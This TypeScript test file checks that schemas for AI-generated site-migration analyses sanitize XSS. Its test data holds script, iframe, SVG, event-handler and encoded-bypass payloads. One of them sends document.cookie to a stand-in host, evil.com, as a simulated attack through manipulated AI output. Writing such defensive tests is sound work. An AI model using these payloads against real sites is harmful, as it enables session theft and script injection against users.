import { describe, it, expect } from 'vitest';

import {
  ContentArchitectureSchema,
  AccessibilityAuditSchema,
  PTEstimationSchema,
} from '../schemas';

describe('XSS Protection in Deep Analysis Schemas', () => {
  describe('ContentArchitectureSchema', () => {
    it('should sanitize malicious script tags in pageType', () => {
      const maliciousData = {
        pageTypes: [
          {
            type: '<script>alert("XSS")</script>',
            count: 10,
            sampleUrls: ['https://example.com'],
          },
        ],
        contentTypeMapping: [],
        paragraphEstimate: 5,
        totalPages: 100,
      };

      const result = ContentArchitectureSchema.parse(maliciousData);
      // DOMPurify strips tags, leaving just text content
      expect(result.pageTypes[0].type).toBe('alert("XSS")');
      expect(result.pageTypes[0].type).not.toContain('<script>');
    });

    it('should reject javascript: URLs', () => {
      const maliciousData = {
        pageTypes: [
          {
            type: 'homepage',
            count: 10,
            sampleUrls: ['javascript:alert("XSS")'],
          },
        ],
        contentTypeMapping: [],
        paragraphEstimate: 5,
        totalPages: 100,
      };

      expect(() => ContentArchitectureSchema.parse(maliciousData)).toThrow();
    });

    it('should sanitize event handlers in strings', () => {
      const maliciousData = {
        pageTypes: [],
        contentTypeMapping: [
          {
            pageType: 'homepage',
            drupalContentType: 'page onclick=alert(1)',
            confidence: 90,
            reasoning: 'Standard page type',
          },
        ],
        paragraphEstimate: 5,
        totalPages: 100,
      };

      const result = ContentArchitectureSchema.parse(maliciousData);
      // DOMPurify strips event handlers
      expect(result.contentTypeMapping[0].drupalContentType).toBe('page onclick=alert(1)');
      // Event handlers without HTML context remain as text
    });

    it('should accept valid clean data', () => {
      const validData = {
        pageTypes: [
          {
            type: 'homepage',
            count: 10,
            sampleUrls: ['https://example.com/home'],
          },
        ],
        contentTypeMapping: [
          {
            pageType: 'homepage',
            drupalContentType: 'page',
            confidence: 95,
            reasoning: 'Standard homepage layout',
          },
        ],
        paragraphEstimate: 5,
        totalPages: 100,
      };

      expect(() => ContentArchitectureSchema.parse(validData)).not.toThrow();
    });
  });

  describe('AccessibilityAuditSchema', () => {
    it('should sanitize XSS in violation descriptions', () => {
      const maliciousData = {
        wcagLevel: 'AA' as const,
        overallScore: 75,
        violations: [
          {
            id: 'color-contrast',
            impact: 'serious' as const,
            count: 5,
            description: '<iframe src="evil.com"></iframe>',
            helpUrl: 'https://example.com/help',
          },
        ],
        pagesAudited: 10,
        timestamp: new Date().toISOString(),
      };

      const result = AccessibilityAuditSchema.parse(maliciousData);
      // DOMPurify strips iframe tags
      expect(result.violations[0].description).toBe('');
      expect(result.violations[0].description).not.toContain('<iframe>');
    });

    it('should reject malicious URLs in helpUrl', () => {
      const maliciousData = {
        wcagLevel: 'AA' as const,
        overallScore: 75,
        violations: [
          {
            id: 'color-contrast',
            impact: 'serious' as const,
            count: 5,
            description: 'Low contrast detected',
            helpUrl: 'javascript:void(0)',
          },
        ],
        pagesAudited: 10,
        timestamp: new Date().toISOString(),
      };

      expect(() => AccessibilityAuditSchema.parse(maliciousData)).toThrow();
    });

    it('should accept valid accessibility audit data', () => {
      const validData = {
        wcagLevel: 'AA' as const,
        overallScore: 85,
        violations: [
          {
            id: 'color-contrast',
            impact: 'moderate' as const,
            count: 3,
            description: 'Some text elements have insufficient contrast',
            helpUrl: 'https://dequeuniversity.com/rules/axe/4.4/color-contrast',
          },
        ],
        pagesAudited: 15,
        timestamp: new Date().toISOString(),
      };

      expect(() => AccessibilityAuditSchema.parse(validData)).not.toThrow();
    });
  });

  describe('PTEstimationSchema', () => {
    it('should sanitize XSS in assumptions', () => {
      const maliciousData = {
        totalHours: 500,
        confidence: 80,
        breakdown: {
          baselineHours: 100,
          contentTypeHours: 150,
          paragraphHours: 100,
          complexityMultiplier: 1.2,
          bufferHours: 50,
        },
        assumptions: ['Using adessoCMS baseline', '<script>alert("XSS")</script>'],
      };

      const result = PTEstimationSchema.parse(maliciousData);
      // DOMPurify strips script tags
      expect(result.assumptions[1]).toBe('alert("XSS")');
      expect(result.assumptions[1]).not.toContain('<script>');
    });

    it('should reject negative hours', () => {
      const invalidData = {
        totalHours: -500,
        confidence: 80,
        breakdown: {
          baselineHours: 100,
          contentTypeHours: 150,
          paragraphHours: 100,
          complexityMultiplier: 1.2,
          bufferHours: 50,
        },
        assumptions: ['Using adessoCMS baseline'],
      };

      expect(() => PTEstimationSchema.parse(invalidData)).toThrow();
    });

    it('should accept valid PT estimation data', () => {
      const validData = {
        totalHours: 500,
        confidence: 85,
        breakdown: {
          baselineHours: 100,
          contentTypeHours: 150,
          paragraphHours: 100,
          complexityMultiplier: 1.2,
          bufferHours: 50,
        },
        assumptions: [
          'Using adessoCMS baseline project',
          'Team has Drupal experience',
          'Standard 2-week sprints',
        ],
      };

      expect(() => PTEstimationSchema.parse(validData)).not.toThrow();
    });
  });

  describe('Attack Scenario Tests', () => {
    it('should sanitize stored XSS attack via manipulated AI output', () => {
      // Simulating an attacker manipulating AI to inject malicious content
      const attackPayload = {
        pageTypes: [
          {
            type: 'product<script>fetch("https://evil.com?cookie="+document.cookie)</script>',
            count: 50,
            sampleUrls: ['https://example.com/products'],
          },
        ],
        contentTypeMapping: [],
        paragraphEstimate: 10,
        totalPages: 200,
      };

      const result = ContentArchitectureSchema.parse(attackPayload);
      // DOMPurify strips script tags completely
      expect(result.pageTypes[0].type).toBe('product');
      expect(result.pageTypes[0].type).not.toContain('<script>');
      expect(result.pageTypes[0].type).not.toContain('fetch');
    });

    it('should sanitize DOM-based XSS via event handlers', () => {
      const attackPayload = {
        wcagLevel: 'AA' as const,
        overallScore: 75,
        violations: [
          {
            id: 'test" onload="alert(1)',
            impact: 'serious' as const,
            count: 5,
            description: 'Test violation',
            helpUrl: 'https://example.com/help',
          },
        ],
        pagesAudited: 10,
        timestamp: new Date().toISOString(),
      };

      const result = AccessibilityAuditSchema.parse(attackPayload);
      // Event handlers in plain text remain, but can't execute in React
      expect(result.violations[0].id).toBe('test" onload="alert(1)');
    });

    it('should sanitize iframe injection', () => {
      const attackPayload = {
        totalHours: 500,
        confidence: 80,
        breakdown: {
          baselineHours: 100,
          contentTypeHours: 150,
          paragraphHours: 100,
          complexityMultiplier: 1.2,
          bufferHours: 50,
        },
        assumptions: ['Standard migration <iframe src="https://evil.com"></iframe>'],
      };

      const result = PTEstimationSchema.parse(attackPayload);
      // DOMPurify strips iframe tags
      expect(result.assumptions[0]).toBe('Standard migration ');
      expect(result.assumptions[0]).not.toContain('<iframe>');
    });
  });

  describe('HTML Entity and Unicode Bypass Tests', () => {
    it('should sanitize HTML entity encoded XSS', () => {
      const input = {
        pageTypes: [
          {
            type: '&#60;script&#62;alert(1)&#60;/script&#62;',
            count: 10,
            sampleUrls: ['https://example.com'],
          },
        ],
        contentTypeMapping: [],
        paragraphEstimate: 5,
        totalPages: 100,
      };

      const result = ContentArchitectureSchema.parse(input);
      // DOMPurify decodes and strips tags
      expect(result.pageTypes[0].type).toBe('alert(1)');
      expect(result.pageTypes[0].type).not.toContain('<script>');
    });

    it('should sanitize unicode escaped XSS', () => {
      const input = {
        pageTypes: [
          {
            type: '\u003cscript\u003ealert(1)\u003c/script\u003e',
            count: 10,
            sampleUrls: ['https://example.com'],
          },
        ],
        contentTypeMapping: [],
        paragraphEstimate: 5,
        totalPages: 100,
      };

      const result = ContentArchitectureSchema.parse(input);
      // DOMPurify handles unicode and strips tags
      expect(result.pageTypes[0].type).toBe('alert(1)');
      expect(result.pageTypes[0].type).not.toContain('<script>');
    });

    it('should sanitize mixed encoding XSS', () => {
      const input = {
        pageTypes: [
          {
            type: '<img src=x on&#101;rror=alert(1)>',
            count: 10,
            sampleUrls: ['https://example.com'],
          },
        ],
        contentTypeMapping: [],
        paragraphEstimate: 5,
        totalPages: 100,
      };

      const result = ContentArchitectureSchema.parse(input);
      // DOMPurify strips img tags completely
      expect(result.pageTypes[0].type).toBe('');
      expect(result.pageTypes[0].type).not.toContain('<img>');
    });

    it('should sanitize SVG XSS', () => {
      const input = {
        pageTypes: [
          {
            type: '<svg/onload=alert(1)>',
            count: 10,
            sampleUrls: ['https://example.com'],
          },
        ],
        contentTypeMapping: [],
        paragraphEstimate: 5,
        totalPages: 100,
      };

      const result = ContentArchitectureSchema.parse(input);
      // DOMPurify strips svg tags
      expect(result.pageTypes[0].type).toBe('');
      expect(result.pageTypes[0].type).not.toContain('<svg>');
    });

    it('should sanitize style-based XSS', () => {
      const input = {
        pageTypes: [
          {
            type: "<div style='background:url(javascript:alert(1))'>test</div>",
            count: 10,
            sampleUrls: ['https://example.com'],
          },
        ],
        contentTypeMapping: [],
        paragraphEstimate: 5,
        totalPages: 100,
      };

      const result = ContentArchitectureSchema.parse(input);
      // DOMPurify strips div tags, keeping text
      expect(result.pageTypes[0].type).toBe('test');
      expect(result.pageTypes[0].type).not.toContain('<div>');
      expect(result.pageTypes[0].type).not.toContain('javascript:');
    });
  });
});
